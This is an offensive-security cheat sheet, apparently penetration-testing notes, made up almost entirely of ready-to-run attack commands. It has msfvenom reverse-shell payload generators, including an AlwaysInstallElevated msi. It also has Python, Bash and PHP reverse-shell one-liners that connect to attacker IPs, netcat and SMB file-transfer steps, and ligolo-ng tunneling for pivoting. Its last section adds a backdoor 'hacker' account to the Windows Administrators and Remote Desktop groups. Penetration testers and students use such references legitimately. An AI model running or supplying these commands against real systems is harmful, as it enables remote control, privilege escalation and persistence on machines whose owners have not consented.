Generate java/jsp\_shell\_reverse\_tcp (war):msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f war \> shell.war
Generate php/reverse\_php (php):msfvenom -p php/reverse\_php LHOST=\<IP\> LPORT=\<PORT\> -f raw \> shell.php
Generate DLL reverse shell (x64):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<attaker-IP\> LPORT=\<listening-port\> -f dll \> filename.dll
Generate AlwaysInstallElevated reverse shell (msi):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<port\> --platform windows -f msi \> reverse.msi
perl
Perl TTY shell:perl -e 'exec "/bin/sh";'
python
Python TTY shell:python -c 'import pty; pty.spawn("/bin/bash")'
Python3 TTY shell:python3 -c 'import pty; pty.spawn("/bin/bash")'
Python reverse shell:python -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
shell
Bash reverse shell:bash -i \>& /dev/tcp/10.0.0.1/4242 0\>&1
PHP reverse shell (command):\<?php echo shell\_exec('bash -i \>& /dev/tcp/10.11.0.106/443 0\>&1');?\>
Bash TTY shell:echo 'os.system('/bin/bash')'
Basic shell:/bin/sh -i
Bash interactive shell:/bin/bash -i
Find files in Windows (CTF Style):cd c:\\Users
Tree files in Windows:tree /F

-----

## File Operations

ftp
Connect to FTP:ftp \<IP\>
Upload file in FTP:put \<file\>
Download file in FTP:get \<file\>
impacket-smbclient
Connect to server (not share):smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address]
impacket-smbserver
Start smbserver (Kali):impacket-smbserver -smb2support \<sharename\> .
mount
Mount NFS share:mount -o rw \<targetIP\>:\<share-location\> \<directory path we created\>
netcat
Send file (Attacker):nc \<target\_ip\> 1234 \< nmap
Receive file (Target):nc -lvp 1234 \> nmap
Detect SMTP version:nc -nv \<IP\> 25
smbclient
List shares:smbclient -L //IP
Connect to share:smbclient //server/share
Connect to share with user:smbclient //server/share -U \<username\>
Connect to share with domain user:smbclient //server/share -U domain/username
Upload file (smbclient):put \<file\>
Download file (smbclient):get \<file\>
Set empty mask (smbclient):mask ""
Enable recursive downloads (smbclient):recurse ON
Disable prompts (smbclient):prompt OFF
Download all files in directory (smbclient):mget \*
wget
Download file on Linux:wget http://lhost/file
windows-copy
Copy file from smbserver (Windows):copy file \\KaliIP\\sharename

-----

## Network Pivoting & Tunneling

ligolo-ng
Create ligolo interface:sudo ip tuntap add user $(whoami) mode tun ligolo
Bring ligolo interface up:sudo ip link set ligolo up
Start ligolo proxy (Attacker):./proxy -laddr 0.0.0.0:9001 -selfcert
Connect to proxy (Target):agent.exe -connect \<LHOST\>:9001 -ignore-cert
Select session (Ligolo console):session
Check target interface (Ligolo console):ifconfig
Start tunneling (Ligolo console):start
Add route to internal network (Attacker):sudo ip r add \<subnet\> dev ligolo
proxychains
Run command through proxychains:proxychains4 crackmapexec smb 10.10.10.0/24

-----

## System & Service Management

adduser
Add Linux user (interactive):adduser \<uname\>
net-user
Add Windows user:net user hacker hacker123 /add
Add Windows user to Administrators:net localgroup Administrators hacker /add
Add Windows user to Remote Desktop Users:net localgroup "Remote Desktop Users" hacker /ADD
Check local administrators:net localgroup Administrators
useradd
Add Linux user:useradd \<uname\>
Add Linux user to specific group/UID:useradd -u \<UID\> -g \<group\> \<uname\>
